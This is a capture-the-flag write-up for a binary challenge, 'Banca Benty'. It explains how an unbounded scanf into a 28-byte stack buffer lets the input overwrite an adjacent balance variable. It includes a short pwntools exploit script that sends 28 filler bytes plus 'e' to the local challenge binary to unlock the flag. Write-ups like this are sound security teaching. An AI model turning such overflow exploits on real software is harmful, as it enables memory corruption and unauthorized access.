# Banca Benty

| | |
|---|---|
| **Section** | Binary |
| **Category** | binary |
| **Solves** | 25 |

## Overview

The binary implements a simple registration flow using `scanf` into a fixed-size buffer:

```c
undefined1 local_28[28];
uint local_c;
```

The program asks for a name and then prints the stored balance (`local_c`). The flag is printed only if the balance is at least 100.

However, `scanf` writes into `local_28` without bounds checking, allowing adjacent stack variables to be overwritten.

## Solve

By overflowing the input buffer, it is possible to overwrite `local_c` and control the balance value.

Since `local_c` is checked as an integer, setting its least significant byte to `0x65` (101), which is known to be `e`, is sufficient to pass the condition.

```python
from pwn import *

p = process('./bentybanca')

payload = b"A"*28 + b"e"

p.sendline(payload)

p.recvuntil(b"Ti diamo un premio!\n")

flag = p.recvline().decode().strip()
print(flag)
```